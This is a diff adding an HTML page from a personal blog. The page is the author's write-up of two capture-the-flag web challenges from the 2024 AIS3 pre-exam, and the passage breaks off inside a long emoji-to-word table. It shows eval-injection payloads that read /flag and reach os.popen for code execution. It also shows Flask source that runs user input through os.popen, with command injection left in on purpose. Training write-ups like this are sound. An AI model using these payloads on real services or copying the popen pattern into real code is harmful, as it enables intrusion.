@@ -1,0 +1,595 @@
+<!DOCTYPE html>
+<html>
+<head><!-- hexo injector head_begin start --><!-- Microsoft Clarity begins-->
+    <script type="text/javascript">
+        (function(c,l,a,r,i,t,y){
+            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+        })(window, document, "clarity", "script", "nq90i0uzl9");
+    </script>
+    <!-- Microsoft Clarity ends-->
+    <!-- Google tag (gtag.js) begins-->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-16453505124"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+    
+      gtag('config', 'AW-16453505124');
+    </script>
+    <!-- Google tag (gtag.js) ends-->
+    <!-- hexo injector head_begin end -->
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+  <title>
+    
+    2024 AIS3 pre-exam &amp; MFCTF writeup 丨
+    
+
+    typo
+  </title>
+
+  
+  <link rel="shortcut icon" href="/icon.svg">
+  
+
+  <link rel="preconnect" href="https://cdnjs.cloudflare.com">
+  
+  <link id="theme" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-light.css">
+  <script src="https://unpkg.com/@highlightjs/cdn-assets@11.9.0/highlight.min.js"></script>
+  
+
+  <!-- 字体 -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+
+  
+<link rel="stylesheet" href="/css/root.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/post.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <header class="header">
+  <section class="header-container">
+    <a class="logo" href="/">TriangeSnake&#39;s Blog</a>
+    <ul class="nav">
+      
+      <li><a href="/archives">archives</a></li>
+      
+      <li><a href="/about">about</a></li>
+      
+    </ul>
+  </section>
+</header>
+  <main class="main">
+    <article class="post">
+  
+  <div class="post-title">2024 AIS3 pre-exam &amp; MFCTF writeup</div>
+  <div class="post-meta">
+    <div class="date">2024 六月 30日</div>
+    <div class="tags">
+      
+      <div class="tag-item">writeup</div>
+      
+      <div class="tag-item">CTF</div>
+      
+      <div class="tag-item">web</div>
+      
+      <div class="tag-item">misc</div>
+      
+    </div>
+  </div>
+  
+
+  <main class="post-content"><h1 id="2024-AIS3-pre-exam-writeup"><a href="#2024-AIS3-pre-exam-writeup" class="headerlink" title="2024 AIS3 pre-exam writeup"></a>2024 AIS3 pre-exam writeup</h1><p>這次幫 AIS3 pre-exam 和 MFCTF 出題，出了兩題：一題 web 和一題 misc (但其實兩題都是web)</p>
+<h2 id="evil-calculator"><a href="#evil-calculator" class="headerlink" title="evil calculator"></a>evil calculator</h2><blockquote>
+<p>This is a calculator written in Python. It’s a simple calculator, but some function in it is VERY EVIL!!<br>Connection info: <a target="_blank" rel="noopener" href="http://chals1.ais3.org:5001/">http://chals1.ais3.org:5001</a><br>Author: TriangleSnake</p>
+</blockquote>
+<p>這是一題很簡單的pyjail(?有jail嗎)，主要問題出在 <code>eval()</code> function，但是有過濾 <code>_</code> 和 <code>space</code> 。<br>因為是warmup題，預期解是用<code>open()</code>讀flag，不會用到<code>_</code>和<code>space</code>。</p>
+<pre><code class="highlight json"><span class="punctuation">&#123;</span><span class="attr">&quot;expression&quot;</span><span class="punctuation">:</span><span class="string">&quot;open(&#x27;/flag&#x27;,&#x27;r&#x27;).read()&quot;</span><span class="punctuation">&#125;</span></code></pre>
+
+<p>當然，你也可以把 <code>_</code> 和 <code>space</code> encode 後 rce</p>
+<pre><code class="highlight json"><span class="punctuation">&#123;</span><span class="attr">&quot;expression&quot;</span><span class="punctuation">:</span><span class="string">&quot;eval(eval(&#x27;chr(95)&#x27;)+eval(&#x27;chr(95)&#x27;)+&#x27;import&#x27;+eval(&#x27;chr(95)&#x27;)+eval(&#x27;chr(95)&#x27;)+\&quot;(&#x27;os&#x27;).popen(&#x27;&#x27;).read()\&quot;)&quot;</span><span class="punctuation">&#125;</span></code></pre>
+
+<blockquote>
+<p>AIS3{7RiANG13_5NAK3_I5_50_3Vi1}</p>
+</blockquote>
+<h2 id="emoji-console"><a href="#emoji-console" class="headerlink" title="emoji console"></a>emoji console</h2><blockquote>
+<p>🔺🐍 😡 🅰️ 🆒 1️⃣Ⓜ️🅾️ 🚅☠️✉️ 🥫🫵 🔍🚩⁉️<br>Connection info: <a target="_blank" rel="noopener" href="http://chals1.ais3.org:5000/">http://chals1.ais3.org:5000</a><br>Author: TriangleSnake</p>
+</blockquote>
+<p>這題和資安沒什麼關係，純粹是拼字遊戲，可以隨便按幾個 emoji 後就可以發現他就是把你輸入的 emoji 轉成英文單字後變成一行指令</p>
+<p><img src="/2024/06/30/2024-AIS3-pre-exam-MFCTF-writeup/1.png" alt="image"></p>
+<p>試幾次會發現一些常用的指令，像是 🐱-&gt;<code>cat</code> 、 💿-&gt;<code>cd</code> ，還有題目剛進去就提示的 🐍-&gt;<code>python</code> 和 ⭐-&gt;<code>*</code></p>
+<ol>
+<li>嘗試使用 <code>cat</code> 命令看目錄下面有什麼<pre><code class="highlight bash">🐱 ⭐</code></pre></li>
+</ol>
+<pre><code class="highlight python"><span class="comment">#!/usr/local/bin/python3</span>
+
+<span class="keyword">import</span> os
+<span class="keyword">from</span> flask <span class="keyword">import</span> Flask,send_file,request,redirect,jsonify,render_template
+<span class="keyword">import</span> json
+<span class="keyword">import</span> string
+<span class="keyword">def</span> <span class="title function_">translate</span>(<span class="params">command:<span class="built_in">str</span></span>)-&gt;<span class="built_in">str</span>:
+    emoji_table = json.load(<span class="built_in">open</span>(<span class="string">&#x27;emoji.json&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>))
+    <span class="keyword">for</span> key <span class="keyword">in</span> emoji_table:
+        <span class="keyword">if</span> key <span class="keyword">in</span> command:
+            command = command.replace(key,emoji_table[key])
+    <span class="keyword">return</span> command.lower()
+
+app = Flask(__name__)
+
+<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span>
+<span class="keyword">def</span> <span class="title function_">index</span>():
+    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)
+
+<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api&#x27;</span></span>)</span>
+<span class="keyword">def</span> <span class="title function_">api</span>():
+    command = request.args.get(<span class="string">&#x27;command&#x27;</span>)
+    
+    <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">set</span>(command).intersection(<span class="built_in">set</span>(string.printable.replace(<span class="string">&quot; &quot;</span>,<span class="string">&#x27;&#x27;</span>))))&gt;<span class="number">0</span>:
+        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;command&#x27;</span>:command,<span class="string">&#x27;result&#x27;</span>:<span class="string">&#x27;Invalid command&#x27;</span>&#125;)
+    command = translate(command)
+    result = os.popen(command+<span class="string">&quot; 2&gt;&amp;1&quot;</span>).read()
+    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;command&#x27;</span>:command,<span class="string">&#x27;result&#x27;</span>:result&#125;)
+    
+
+<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:
+    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="number">5000</span>)
+
+&#123;
+    <span class="string">&quot;😀&quot;</span>: <span class="string">&quot;:D&quot;</span>,
+    <span class="string">&quot;😁&quot;</span>: <span class="string">&quot;:D&quot;</span>,
+    <span class="string">&quot;😂&quot;</span>: <span class="string">&quot;:&#x27;)&quot;</span>,
+    <span class="string">&quot;🤣&quot;</span>: <span class="string">&quot;XD&quot;</span>,
+    <span class="string">&quot;😃&quot;</span>: <span class="string">&quot;:D&quot;</span>,
+    <span class="string">&quot;😄&quot;</span>: <span class="string">&quot;:D&quot;</span>,
+    <span class="string">&quot;😅&quot;</span>: <span class="string">&quot;&#x27;:D&quot;</span>,
+    <span class="string">&quot;😆&quot;</span>: <span class="string">&quot;XD&quot;</span>,
+    <span class="string">&quot;😉&quot;</span>: <span class="string">&quot;;)&quot;</span>,
+    <span class="string">&quot;😊&quot;</span>: <span class="string">&quot;:)&quot;</span>,
+    <span class="string">&quot;😋&quot;</span>: <span class="string">&quot;:P&quot;</span>,
+    <span class="string">&quot;😎&quot;</span>: <span class="string">&quot;B)&quot;</span>,
+    <span class="string">&quot;😍&quot;</span>: <span class="string">&quot;:)&quot;</span>,
+    <span class="string">&quot;😘&quot;</span>: <span class="string">&quot;:*&quot;</span>,
+    <span class="string">&quot;😗&quot;</span>: <span class="string">&quot;:*&quot;</span>,
+    <span class="string">&quot;😙&quot;</span>: <span class="string">&quot;:*&quot;</span>,
+    <span class="string">&quot;😚&quot;</span>: <span class="string">&quot;:*&quot;</span>,
+    <span class="string">&quot;☺️&quot;</span>: <span class="string">&quot;:)&quot;</span>,
+    <span class="string">&quot;🙂&quot;</span>: <span class="string">&quot;:)&quot;</span>,
+    <span class="string">&quot;🤗&quot;</span>: <span class="string">&quot;:)&quot;</span>,
+    <span class="string">&quot;🤩&quot;</span>: <span class="string">&quot;:)&quot;</span>,
+    <span class="string">&quot;🤔&quot;</span>: <span class="string">&quot;:?&quot;</span>,
+    <span class="string">&quot;🤨&quot;</span>: <span class="string">&quot;:/&quot;</span>,
+    <span class="string">&quot;😐&quot;</span>: <span class="string">&quot;:|&quot;</span>,
+    <span class="string">&quot;😑&quot;</span>: <span class="string">&quot;:|&quot;</span>,
+    <span class="string">&quot;😶&quot;</span>: <span class="string">&quot;:|&quot;</span>,
+    <span class="string">&quot;🙄&quot;</span>: <span class="string">&quot;:/&quot;</span>,
+    <span class="string">&quot;😏&quot;</span>: <span class="string">&quot;:]&quot;</span>,
+    <span class="string">&quot;😣&quot;</span>: <span class="string">&quot;&gt;:&quot;</span>,
+    <span class="string">&quot;😥&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,
+    <span class="string">&quot;😮&quot;</span>: <span class="string">&quot;:o&quot;</span>,
+    <span class="string">&quot;🤐&quot;</span>: <span class="string">&quot;:x&quot;</span>,
+    <span class="string">&quot;😯&quot;</span>: <span class="string">&quot;:o&quot;</span>,
+    <span class="string">&quot;😪&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,
+    <span class="string">&quot;😫&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,
+    <span class="string">&quot;😴&quot;</span>: <span class="string">&quot;Zzz&quot;</span>,
+    <span class="string">&quot;😌&quot;</span>: <span class="string">&quot;:)&quot;</span>,
+    <span class="string">&quot;😛&quot;</span>: <span class="string">&quot;:P&quot;</span>,
+    <span class="string">&quot;😜&quot;</span>: <span class="string">&quot;;P&quot;</span>,
+    <span class="string">&quot;😝&quot;</span>: <span class="string">&quot;XP&quot;</span>,
+    <span class="string">&quot;🤤&quot;</span>: <span class="string">&quot;:P&quot;</span>,
+    <span class="string">&quot;😒&quot;</span>: <span class="string">&quot;:/&quot;</span>,
+    <span class="string">&quot;😓&quot;</span>: <span class="string">&quot;;/&quot;</span>,
+    <span class="string">&quot;😔&quot;</span>: <span class="string">&quot;:(&quot;</span>,
+    <span class="string">&quot;😕&quot;</span>: <span class="string">&quot;:/&quot;</span>,
+    <span class="string">&quot;🙃&quot;</span>: <span class="string">&quot;(:&quot;</span>,
+    <span class="string">&quot;🤑&quot;</span>: <span class="string">&quot;$)&quot;</span>,
+    <span class="string">&quot;😲&quot;</span>: <span class="string">&quot;:O&quot;</span>,
+    <span class="string">&quot;☹️&quot;</span>: <span class="string">&quot;:(&quot;</span>,
+    <span class="string">&quot;🙁&quot;</span>: <span class="string">&quot;:(&quot;</span>,
+    <span class="string">&quot;😖&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,
+    <span class="string">&quot;😞&quot;</span>: <span class="string">&quot;:(&quot;</span>,
+    <span class="string">&quot;😟&quot;</span>: <span class="string">&quot;:(&quot;</span>,
+    <span class="string">&quot;😤&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,
+    <span class="string">&quot;😢&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,
+    <span class="string">&quot;😭&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,
+    <span class="string">&quot;😦&quot;</span>: <span class="string">&quot;:(&quot;</span>,
+    <span class="string">&quot;😧&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,
+    <span class="string">&quot;😨&quot;</span>: <span class="string">&quot;:O&quot;</span>,
+    <span class="string">&quot;😩&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,
+    <span class="string">&quot;🤯&quot;</span>: <span class="string">&quot;:O&quot;</span>,
+    <span class="string">&quot;😬&quot;</span>: <span class="string">&quot;:E&quot;</span>,
+    <span class="string">&quot;😰&quot;</span>: <span class="string">&quot;:(&quot;</span>,
+    <span class="string">&quot;😱&quot;</span>: <span class="string">&quot;:O&quot;</span>,
+    <span class="string">&quot;🥵&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,
+    <span class="string">&quot;🥶&quot;</span>: <span class="string">&quot;:(&quot;</span>,
+    <span class="string">&quot;😳&quot;</span>: <span class="string">&quot;:$&quot;</span>,
+    <span class="string">&quot;🤪&quot;</span>: <span class="string">&quot;:P&quot;</span>,
+    <span class="string">&quot;😵&quot;</span>: <span class="string">&quot;X(&quot;</span>,
+    <span class="string">&quot;🥴&quot;</span>: <span class="string">&quot;:P&quot;</span>,
+    <span class="string">&quot;😠&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,
+    <span class="string">&quot;😡&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,
+    <span class="string">&quot;🤬&quot;</span>: <span class="string">&quot;#$%&amp;!&quot;</span>,
+    <span class="string">&quot;🤕&quot;</span>: <span class="string">&quot;:(&quot;</span>,
+    <span class="string">&quot;🤢&quot;</span>: <span class="string">&quot;X(&quot;</span>,
+    <span class="string">&quot;🤮&quot;</span>: <span class="string">&quot;:P&quot;</span>,
+    <span class="string">&quot;🤧&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,
+    <span class="string">&quot;😇&quot;</span>: <span class="string">&quot;O:)&quot;</span>,
+    <span class="string">&quot;🥳&quot;</span>: <span class="string">&quot;:D&quot;</span>,
+    <span class="string">&quot;🥺&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,
+    <span class="string">&quot;🤡&quot;</span>: <span class="string">&quot;:o)&quot;</span>,
+    <span class="string">&quot;🤠&quot;</span>: <span class="string">&quot;Y)&quot;</span>,
+    <span class="string">&quot;🤥&quot;</span>: <span class="string">&quot;:L&quot;</span>,
+    <span class="string">&quot;🤫&quot;</span>: <span class="string">&quot;:x&quot;</span>,
+    <span class="string">&quot;🤭&quot;</span>: <span class="string">&quot;:x&quot;</span>,
+    <span class="string">&quot;🐶&quot;</span>: <span class="string">&quot;dog&quot;</span>,
+    <span class="string">&quot;🐱&quot;</span>: <span class="string">&quot;cat&quot;</span>,
+    <span class="string">&quot;🐭&quot;</span>: <span class="string">&quot;mouse&quot;</span>,
+    <span class="string">&quot;🐹&quot;</span>: <span class="string">&quot;hamster&quot;</span>,
+    <span class="string">&quot;🐰&quot;</span>: <span class="string">&quot;rabbit&quot;</span>,
+    <span class="string">&quot;🦊&quot;</span>: <span class="string">&quot;fox&quot;</span>,
+    <span class="string">&quot;🐻&quot;</span>: <span class="string">&quot;bear&quot;</span>,
+    <span class="string">&quot;🐼&quot;</span>: <span class="string">&quot;panda&quot;</span>,
+    <span class="string">&quot;🐨&quot;</span>: <span class="string">&quot;koala&quot;</span>,
+    <span class="string">&quot;🐯&quot;</span>: <span class="string">&quot;tiger&quot;</span>,
+    <span class="string">&quot;🦁&quot;</span>: <span class="string">&quot;lion&quot;</span>,
+    <span class="string">&quot;🐮&quot;</span>: <span class="string">&quot;cow&quot;</span>,
+    <span class="string">&quot;🐷&quot;</span>: <span class="string">&quot;pig&quot;</span>,
+    <span class="string">&quot;🐽&quot;</span>: <span class="string">&quot;pig nose&quot;</span>,
+    <span class="string">&quot;🐸&quot;</span>: <span class="string">&quot;frog&quot;</span>,
+    <span class="string">&quot;🐒&quot;</span>: <span class="string">&quot;monkey&quot;</span>,
+    <span class="string">&quot;🐔&quot;</span>: <span class="string">&quot;chicken&quot;</span>,
+    <span class="string">&quot;🐧&quot;</span>: <span class="string">&quot;penguin&quot;</span>,
+    <span class="string">&quot;🐦&quot;</span>: <span class="string">&quot;bird&quot;</span>,
+    <span class="string">&quot;🐤&quot;</span>: <span class="string">&quot;baby chick&quot;</span>,
+    <span class="string">&quot;🐣&quot;</span>: <span class="string">&quot;hatching chick&quot;</span>,
+    <span class="string">&quot;🐥&quot;</span>: <span class="string">&quot;front-facing baby chick&quot;</span>,
+    <span class="string">&quot;🦆&quot;</span>: <span class="string">&quot;duck&quot;</span>,
+    <span class="string">&quot;🦅&quot;</span>: <span class="string">&quot;eagle&quot;</span>,
+    <span class="string">&quot;🦉&quot;</span>: <span class="string">&quot;owl&quot;</span>,
+    <span class="string">&quot;🦇&quot;</span>: <span class="string">&quot;bat&quot;</span>,
+    <span class="string">&quot;🐺&quot;</span>: <span class="string">&quot;wolf&quot;</span>,
+    <span class="string">&quot;🐗&quot;</span>: <span class="string">&quot;boar&quot;</span>,
+    <span class="string">&quot;🐴&quot;</span>: <span class="string">&quot;horse&quot;</span>,
+    <span class="string">&quot;🦄&quot;</span>: <span class="string">&quot;unicorn&quot;</span>,
+    <span class="string">&quot;🐝&quot;</span>: <span class="string">&quot;bee&quot;</span>,
+    <span class="string">&quot;🐛&quot;</span>: <span class="string">&quot;bug&quot;</span>,
+    <span class="string">&quot;🦋&quot;</span>: <span class="string">&quot;butterfly&quot;</span>,
+    <span class="string">&quot;🐌&quot;</span>: <span class="string">&quot;snail&quot;</span>,
+    <span class="string">&quot;🐞&quot;</span>: <span class="string">&quot;lady beetle&quot;</span>,
+    <span class="string">&quot;🐜&quot;</span>: <span class="string">&quot;ant&quot;</span>,
+    <span class="string">&quot;🦟&quot;</span>: <span class="string">&quot;mosquito&quot;</span>,
+    <span class="string">&quot;🦗&quot;</span>: <span class="string">&quot;cricket&quot;</span>,
+    <span class="string">&quot;🕷️&quot;</span>: <span class="string">&quot;spider&quot;</span>,
+    <span class="string">&quot;🕸️&quot;</span>: <span class="string">&quot;spider web&quot;</span>,
+    <span class="string">&quot;🦂&quot;</span>: <span class="string">&quot;scorpion&quot;</span>,
+    <span class="string">&quot;🐢&quot;</span>: <span class="string">&quot;turtle&quot;</span>,
+    <span class="string">&quot;🐍&quot;</span>: <span class="string">&quot;python&quot;</span>,
+    <span class="string">&quot;🦎&quot;</span>: <span class="string">&quot;lizard&quot;</span>,
+    <span class="string">&quot;🦖&quot;</span>: <span class="string">&quot;T-Rex&quot;</span>,
+    <span class="string">&quot;🦕&quot;</span>: <span class="string">&quot;sauropod&quot;</span>,
+    <span class="string">&quot;🐙&quot;</span>: <span class="string">&quot;octopus&quot;</span>,
+    <span class="string">&quot;🦑&quot;</span>: <span class="string">&quot;squid&quot;</span>,
+    <span class="string">&quot;🦐&quot;</span>: <span class="string">&quot;shrimp&quot;</span>,
+    <span class="string">&quot;🦞&quot;</span>: <span class="string">&quot;lobster&quot;</span>,
+    <span class="string">&quot;🦀&quot;</span>: <span class="string">&quot;crab&quot;</span>,
+    <span class="string">&quot;🐡&quot;</span>: <span class="string">&quot;blowfish&quot;</span>,
+    <span class="string">&quot;🐠&quot;</span>: <span class="string">&quot;tropical fish&quot;</span>,
+    <span class="string">&quot;🐟&quot;</span>: <span class="string">&quot;fish&quot;</span>,
+    <span class="string">&quot;🐬&quot;</span>: <span class="string">&quot;dolphin&quot;</span>,
+    <span class="string">&quot;🐳&quot;</span>: <span class="string">&quot;whale&quot;</span>,
+    <span class="string">&quot;🐋&quot;</span>: <span class="string">&quot;whale&quot;</span>,
+    <span class="string">&quot;🦈&quot;</span>: <span class="string">&quot;shark&quot;</span>,
+    <span class="string">&quot;🐊&quot;</span>: <span class="string">&quot;crocodile&quot;</span>,
+    <span class="string">&quot;🐅&quot;</span>: <span class="string">&quot;tiger&quot;</span>,
+    <span class="string">&quot;🐆&quot;</span>: <span class="string">&quot;leopard&quot;</span>,
+    <span class="string">&quot;🦓&quot;</span>: <span class="string">&quot;zebra&quot;</span>,
+    <span class="string">&quot;🦍&quot;</span>: <span class="string">&quot;gorilla&quot;</span>,
+    <span class="string">&quot;🦧&quot;</span>: <span class="string">&quot;orangutan&quot;</span>,
+    <span class="string">&quot;🦣&quot;</span>: <span class="string">&quot;mammoth&quot;</span>,
+    <span class="string">&quot;🐘&quot;</span>: <span class="string">&quot;elephant&quot;</span>,
+    <span class="string">&quot;🦛&quot;</span>: <span class="string">&quot;hippopotamus&quot;</span>,
+    <span class="string">&quot;🦏&quot;</span>: <span class="string">&quot;rhinoceros&quot;</span>,
+    <span class="string">&quot;🐪&quot;</span>: <span class="string">&quot;camel&quot;</span>,
+    <span class="string">&quot;🐫&quot;</span>: <span class="string">&quot;two-hump camel&quot;</span>,
+    <span class="string">&quot;🦒&quot;</span>: <span class="string">&quot;giraffe&quot;</span>,
+    <span class="string">&quot;🦘&quot;</span>: <span class="string">&quot;kangaroo&quot;</span>,
+    <span class="string">&quot;🦬&quot;</span>: <span class="string">&quot;bison&quot;</span>,
+    <span class="string">&quot;🦥&quot;</span>: <span class="string">&quot;sloth&quot;</span>,
+    <span class="string">&quot;🦦&quot;</span>: <span class="string">&quot;otter&quot;</span>,
+    <span class="string">&quot;🦨&quot;</span>: <span class="string">&quot;skunk&quot;</span>,
+    <span class="string">&quot;🦡&quot;</span>: <span class="string">&quot;badger&quot;</span>,
+    <span class="string">&quot;🐾&quot;</span>: <span class="string">&quot;paw prints&quot;</span>,
+    <span class="string">&quot;◼️&quot;</span>: <span class="string">&quot;black square&quot;</span>,
+    <span class="string">&quot;◻️&quot;</span>: <span class="string">&quot;white square&quot;</span>,
+    <span class="string">&quot;◾&quot;</span>: <span class="string">&quot;black medium square&quot;</span>,
+    <span class="string">&quot;◽&quot;</span>: <span class="string">&quot;white medium square&quot;</span>,
+    <span class="string">&quot;▪️&quot;</span>: <span class="string">&quot;black small square&quot;</span>,
+    <span class="string">&quot;▫️&quot;</span>: <span class="string">&quot;white small square&quot;</span>,
+    <span class="string">&quot;🔶&quot;</span>: <span class="string">&quot;large orange diamond&quot;</span>,
+    <span class="string">&quot;🔷&quot;</span>: <span class="string">&quot;large blue diamond&quot;</span>,
+    <span class="string">&quot;🔸&quot;</span>: <span class="string">&quot;small orange diamond&quot;</span>,
+    <span class="string">&quot;🔹&quot;</span>: <span class="string">&quot;small blue diamond&quot;</span>,
+    <span class="string">&quot;🔺&quot;</span>: <span class="string">&quot;triangle&quot;</span>,
+    <span class="string">&quot;🔻&quot;</span>: <span class="string">&quot;triangle&quot;</span>,
+    <span class="string">&quot;🔼&quot;</span>: <span class="string">&quot;triangle&quot;</span>,
+    <span class="string">&quot;🔽&quot;</span>: <span class="string">&quot;triangle&quot;</span>,
+    <span class="string">&quot;🔘&quot;</span>: <span class="string">&quot;circle&quot;</span>,
+    <span class="string">&quot;⚪&quot;</span>: <span class="string">&quot;circle&quot;</span>,
+    <span class="string">&quot;⚫&quot;</span>: <span class="string">&quot;black circle&quot;</span>,
+    <span class="string">&quot;🟠&quot;</span>: <span class="string">&quot;orange circle&quot;</span>,
+    <span class="string">&quot;🟢&quot;</span>: <span class="string">&quot;green circle&quot;</span>,
+    <span class="string">&quot;🔵&quot;</span>: <span class="string">&quot;blue circle&quot;</span>,
+    <span class="string">&quot;🟣&quot;</span>: <span class="string">&quot;purple circle&quot;</span>,
+    <span class="string">&quot;🟡&quot;</span>: <span class="string">&quot;yellow circle&quot;</span>,
+    <span class="string">&quot;🟤&quot;</span>: <span class="string">&quot;brown circle&quot;</span>,
+    <span class="string">&quot;⭕&quot;</span>: <span class="string">&quot;empty circle&quot;</span>,
+    <span class="string">&quot;🅰️&quot;</span>: <span class="string">&quot;A&quot;</span>,
+    <span class="string">&quot;🅱️&quot;</span>: <span class="string">&quot;B&quot;</span>,
+    <span class="string">&quot;🅾️&quot;</span>: <span class="string">&quot;O&quot;</span>,
+    <span class="string">&quot;ℹ️&quot;</span>: <span class="string">&quot;i&quot;</span>,
+    <span class="string">&quot;🅿️&quot;</span>: <span class="string">&quot;P&quot;</span>,
+    <span class="string">&quot;Ⓜ️&quot;</span>: <span class="string">&quot;M&quot;</span>,
+    <span class="string">&quot;🆎&quot;</span>: <span class="string">&quot;AB&quot;</span>,
+    <span class="string">&quot;🆑&quot;</span>: <span class="string">&quot;CL&quot;</span>,
+    <span class="string">&quot;🆒&quot;</span>: <span class="string">&quot;COOL&quot;</span>,
+    <span class="string">&quot;🆓&quot;</span>: <span class="string">&quot;FREE&quot;</span>,
+    <span class="string">&quot;🆔&quot;</span>: <span class="string">&quot;ID&quot;</span>,
+    <span class="string">&quot;🆕&quot;</span>: <span class="string">&quot;NEW&quot;</span>,
+    <span class="string">&quot;🆖&quot;</span>: <span class="string">&quot;NG&quot;</span>,
+    <span class="string">&quot;🆗&quot;</span>: <span class="string">&quot;OK&quot;</span>,
+    <span class="string">&quot;🆘&quot;</span>: <span class="string">&quot;SOS&quot;</span>,
+    <span class="string">&quot;🆙&quot;</span>: <span class="string">&quot;UP&quot;</span>,
+    <span class="string">&quot;🆚&quot;</span>: <span class="string">&quot;VS&quot;</span>,
+    <span class="string">&quot;㊗️&quot;</span>: <span class="string">&quot;祝&quot;</span>,
+    <span class="string">&quot;㊙️&quot;</span>: <span class="string">&quot;秘&quot;</span>,
+    <span class="string">&quot;🈺&quot;</span>: <span class="string">&quot;營&quot;</span>,
+    <span class="string">&quot;🈯&quot;</span>: <span class="string">&quot;指&quot;</span>,
+    <span class="string">&quot;🉐&quot;</span>: <span class="string">&quot;得&quot;</span>,
+    <span class="string">&quot;🈹&quot;</span>: <span class="string">&quot;割&quot;</span>,
+    <span class="string">&quot;🈚&quot;</span>: <span class="string">&quot;無&quot;</span>,
+    <span class="string">&quot;🈲&quot;</span>: <span class="string">&quot;禁&quot;</span>,
+    <span class="string">&quot;🈸&quot;</span>: <span class="string">&quot;申&quot;</span>,
+    <span class="string">&quot;🈴&quot;</span>: <span class="string">&quot;合&quot;</span>,
+    <span class="string">&quot;🈳&quot;</span>: <span class="string">&quot;空&quot;</span>,
+    <span class="string">&quot;🈵&quot;</span>: <span class="string">&quot;滿&quot;</span>,
+    <span class="string">&quot;🈶&quot;</span>: <span class="string">&quot;有&quot;</span>,
+    <span class="string">&quot;🈷️&quot;</span>: <span class="string">&quot;月&quot;</span>,
+    <span class="string">&quot;🚗&quot;</span>: <span class="string">&quot;car&quot;</span>,
+    <span class="string">&quot;🚕&quot;</span>: <span class="string">&quot;taxi&quot;</span>,
+    <span class="string">&quot;🚙&quot;</span>: <span class="string">&quot;SUV&quot;</span>,
+    <span class="string">&quot;🚌&quot;</span>: <span class="string">&quot;bus&quot;</span>,
+    <span class="string">&quot;🚎&quot;</span>: <span class="string">&quot;trolleybus&quot;</span>,
+    <span class="string">&quot;🏎️&quot;</span>: <span class="string">&quot;race car&quot;</span>,
+    <span class="string">&quot;🚓&quot;</span>: <span class="string">&quot;police car&quot;</span>,
+    <span class="string">&quot;🚑&quot;</span>: <span class="string">&quot;ambulance&quot;</span>,
+    <span class="string">&quot;🚒&quot;</span>: <span class="string">&quot;fire engine&quot;</span>,
+    <span class="string">&quot;🚐&quot;</span>: <span class="string">&quot;minibus&quot;</span>,
+    <span class="string">&quot;🚚&quot;</span>: <span class="string">&quot;delivery truck&quot;</span>,
+    <span class="string">&quot;🚛&quot;</span>: <span class="string">&quot;articulated lorry&quot;</span>,
+    <span class="string">&quot;🚜&quot;</span>: <span class="string">&quot;tractor&quot;</span>,
+    <span class="string">&quot;🛴&quot;</span>: <span class="string">&quot;kick scooter&quot;</span>,
+    <span class="string">&quot;🚲&quot;</span>: <span class="string">&quot;bicycle&quot;</span>,
+    <span class="string">&quot;🛵&quot;</span>: <span class="string">&quot;scooter&quot;</span>,
+    <span class="string">&quot;🏍️&quot;</span>: <span class="string">&quot;motorcycle&quot;</span>,
+    <span class="string">&quot;✈️&quot;</span>: <span class="string">&quot;airplane&quot;</span>,
+    <span class="string">&quot;🚀&quot;</span>: <span class="string">&quot;rocket&quot;</span>,
+    <span class="string">&quot;🛸&quot;</span>: <span class="string">&quot;UFO&quot;</span>,
+    <span class="string">&quot;🚁&quot;</span>: <span class="string">&quot;helicopter&quot;</span>,
+    <span class="string">&quot;🛶&quot;</span>: <span class="string">&quot;canoe&quot;</span>,
+    <span class="string">&quot;⛵&quot;</span>: <span class="string">&quot;sailboat&quot;</span>,
+    <span class="string">&quot;🚤&quot;</span>: <span class="string">&quot;speedboat&quot;</span>,
+    <span class="string">&quot;🛳️&quot;</span>: <span class="string">&quot;passenger ship&quot;</span>,
+    <span class="string">&quot;⛴️&quot;</span>: <span class="string">&quot;ferry&quot;</span>,
+    <span class="string">&quot;🛥️&quot;</span>: <span class="string">&quot;motor boat&quot;</span>,
